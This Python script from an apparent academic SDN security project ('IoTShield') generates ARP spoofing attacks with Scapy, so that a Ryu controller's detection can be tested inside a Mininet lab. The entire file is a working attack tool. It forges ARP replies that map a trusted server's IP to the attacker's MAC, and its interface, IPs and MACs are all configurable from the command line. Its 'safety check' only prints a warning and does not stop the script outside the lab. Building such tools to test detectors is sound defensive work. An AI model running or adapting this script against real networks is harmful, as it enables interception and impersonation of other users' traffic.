"""
IoTShield ARP Spoofing Attack Generator
========================================
LAB USE ONLY — runs exclusively inside the isolated Mininet network.

This script simulates h3 (compromised host) performing an ARP spoofing
attack by sending gratuitous ARP replies that falsely map the trusted
server's IP (10.0.0.2) to h3's MAC address (00:00:00:00:00:03).

The Ryu SDN controller detects this mismatch and drops subsequent packets.

Usage (inside Mininet CLI on host h3, or via run_attack.sh):
    python3 attacks/arp_spoof.py [--count N] [--interval S] [--dry-run]

WARNING: This script is for academic lab demonstration ONLY.
         Do NOT run outside the isolated Mininet environment.
"""

import argparse
import json
import sys
import time
from pathlib import Path

# ── Safety check: verify we're inside the Mininet lab ────────────────────────
def _safety_check():
    """Warn if this doesn't appear to be an isolated lab environment."""
    import socket
    hostname = socket.gethostname()
    # Mininet hosts have names like h1, h2, h3 or run in netns
    is_likely_mininet = (
        hostname in ("h1", "h2", "h3", "s1")
        or "mininet" in hostname.lower()
        or Path("/tmp/iotshield_mininet.pid").exists()
    )
    if not is_likely_mininet:
        print(
            "\n[WARNING] This script does not appear to be running inside "
            "the Mininet lab.\n"
            "          This script MUST only run inside the isolated Mininet "
            "network namespace.\n"
            "          Press Ctrl+C now if this is unintentional.\n"
        )
        time.sleep(3)
    return is_likely_mininet


# ── Scapy import (needed at runtime) ─────────────────────────────────────────
def _import_scapy():
    try:
        from scapy.all import ARP, Ether, sendp, conf
        conf.verb = 0  # suppress Scapy output
        return ARP, Ether, sendp
    except ImportError:
        print("[ERROR] Scapy is not installed. Run: pip3 install scapy")
        sys.exit(1)


# ── Main attack function ──────────────────────────────────────────────────────

def run_attack(
    iface: str = "h3-eth0",
    attacker_mac: str = "00:00:00:00:00:03",
    attacker_ip: str = "10.0.0.3",
    spoofed_ip: str = "10.0.0.2",       # Trusted server IP being impersonated
    victim_ip: str = "10.0.0.1",         # Target of the ARP reply
    victim_mac: str = "ff:ff:ff:ff:ff:ff",  # Broadcast or h1 MAC
    count: int = 10,
    interval: float = 0.5,
    dry_run: bool = False,
) -> dict:
    """
    Send spoofed ARP replies on the given interface.

    Returns a dict with:
      - start_time: ISO timestamp
      - packets_attempted: number of packets sent
      - spoofed_ip: the IP being impersonated
      - attacker_mac: the false MAC being advertised
      - dry_run: whether this was a real send
    """
    ARP, Ether, sendp = _import_scapy()

    start_ts = time.time()
    start_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(start_ts))

    print("=" * 60)
    print("  IoTShield — ARP Spoofing Attack Generator")
    print("  LAB USE ONLY — Isolated Mininet Network")
    print("=" * 60)
    print(f"  Attacker:     {attacker_ip} ({attacker_mac})")
    print(f"  Spoofing IP:  {spoofed_ip}  (Trusted Server)")
    print(f"  Target:       {victim_ip} (IoT Sensor/Victim)")
    print(f"  Packets:      {count}")
    print(f"  Interval:     {interval}s")
    print(f"  Interface:    {iface}")
    print(f"  Mode:         {'DRY-RUN (no packets sent)' if dry_run else 'LIVE'}")
    print(f"  Started at:   {start_iso}")
    print("=" * 60)

    if dry_run:
        print("\n[DRY-RUN] Pre-flight checks:")
        print(f"  ✓ Would send {count} ARP REPLY packets")
        print(f"  ✓ Ethernet src: {attacker_mac}")
        print(f"  ✓ ARP sender IP: {spoofed_ip} (FALSE — actual attacker IP: {attacker_ip})")
        print(f"  ✓ ARP sender MAC: {attacker_mac}")
        print(f"  ✓ ARP target: {victim_ip}")
        print(f"  ✓ ARP opcode: 2 (REPLY / is-at)")
        print("\n[DRY-RUN] Packet structure:")
        print(f"  Ether(src={attacker_mac}, dst={victim_mac})")
        print(f"  / ARP(op=2, hwsrc={attacker_mac}, psrc={spoofed_ip},")
        print(f"         hwdst={victim_mac}, pdst={victim_ip})")
        print("\n[DRY-RUN] No packets were sent.")
        return {
            "start_time": start_iso,
            "packets_attempted": 0,
            "spoofed_ip": spoofed_ip,
            "attacker_mac": attacker_mac,
            "dry_run": True,
        }

    # Notify controller via event log that attack is starting
    try:
        _HERE = Path(__file__).resolve().parent.parent
        sys.path.insert(0, str(_HERE))
        from controller.event_logger import log_attack_start
        log_attack_start(attacker_ip, attacker_mac, spoofed_ip)
    except Exception:
        pass  # Event logging is best-effort

    # ── Build the spoofed ARP packet ─────────────────────────────────────────
    # Ethernet frame: src=attacker_mac, dst=victim or broadcast
    # ARP REPLY: "10.0.0.2 is at 00:00:00:00:00:03" (FALSE)
    spoofed_pkt = (
        Ether(src=attacker_mac, dst=victim_mac)
        / ARP(
            op=2,                    # ARP REPLY (is-at)
            hwsrc=attacker_mac,      # Attacker's real MAC
            psrc=spoofed_ip,         # FALSE: claiming server's IP
            hwdst=victim_mac,        # Victim's MAC (or broadcast)
            pdst=victim_ip,          # Targeted at victim
        )
    )

    sent = 0
    print(f"\n[ATTACK] Sending {count} spoofed ARP replies...")
    try:
        for i in range(count):
            sendp(spoofed_pkt, iface=iface, verbose=False)
            sent += 1
            print(f"  [{i+1:3d}/{count}] Sent: {spoofed_ip} is-at {attacker_mac} → {victim_ip}")
            if i < count - 1:
                time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[ATTACK] Interrupted after {sent} packets.")
    except OSError as exc:
        print(f"\n[ERROR] Send failed: {exc}")
        print("        Make sure you're running inside Mininet on interface h3-eth0")

    end_ts = time.time()
    duration = end_ts - start_ts

    print("\n" + "=" * 60)
    print(f"  [ATTACK COMPLETE]")
    print(f"  Packets attempted: {sent}/{count}")
    print(f"  Duration:          {duration:.2f}s")
    print(f"  Check Ryu logs for detection events.")
    print(f"  Check dashboard:   http://localhost:5000")
    print("=" * 60 + "\n")

    # Write results to file for metrics collection
    results = {
        "start_time": start_iso,
        "end_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(end_ts)),
        "packets_attempted": sent,
        "spoofed_ip": spoofed_ip,
        "attacker_mac": attacker_mac,
        "victim_ip": victim_ip,
        "duration_s": round(duration, 3),
        "dry_run": False,
    }

    results_dir = _HERE / "results"
    results_dir.mkdir(exist_ok=True)
    results_file = results_dir / "attack_run.json"
    with open(results_file, "w") as fh:
        json.dump(results, fh, indent=2)
    print(f"[ATTACK] Results written to {results_file}")

    return results


# ── CLI entry point ───────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="IoTShield ARP Spoofing Attack Generator — LAB USE ONLY",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run from Mininet h3 CLI:
  python3 attacks/arp_spoof.py

  # Custom count and interval:
  python3 attacks/arp_spoof.py --count 20 --interval 0.2

  # Dry-run (no packets sent):
  python3 attacks/arp_spoof.py --dry-run

  # Custom interface:
  python3 attacks/arp_spoof.py --iface h3-eth0
        """,
    )
    parser.add_argument(
        "--iface", default="h3-eth0",
        help="Network interface to send packets on (default: h3-eth0)"
    )
    parser.add_argument(
        "--count", type=int, default=10,
        help="Number of spoofed ARP packets to send (default: 10)"
    )
    parser.add_argument(
        "--interval", type=float, default=0.5,
        help="Seconds between packets (default: 0.5)"
    )
    parser.add_argument(
        "--attacker-mac", default="00:00:00:00:00:03",
        help="Attacker MAC address (default: 00:00:00:00:00:03)"
    )
    parser.add_argument(
        "--attacker-ip", default="10.0.0.3",
        help="Attacker IP address (default: 10.0.0.3)"
    )
    parser.add_argument(
        "--spoofed-ip", default="10.0.0.2",
        help="IP to impersonate/spoof (default: 10.0.0.2, the trusted server)"
    )
    parser.add_argument(
        "--victim-ip", default="10.0.0.1",
        help="Victim IP to send ARP replies to (default: 10.0.0.1)"
    )
    parser.add_argument(
        "--victim-mac", default="ff:ff:ff:ff:ff:ff",
        help="Victim MAC (default: broadcast ff:ff:ff:ff:ff:ff)"
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Print what would be sent without actually sending"
    )

    args = parser.parse_args()

    _safety_check()

    run_attack(
        iface=args.iface,
        attacker_mac=args.attacker_mac,
        attacker_ip=args.attacker_ip,
        spoofed_ip=args.spoofed_ip,
        victim_ip=args.victim_ip,
        victim_mac=args.victim_mac,
        count=args.count,
        interval=args.interval,
        dry_run=args.dry_run,
    )


if __name__ == "__main__":
    main()

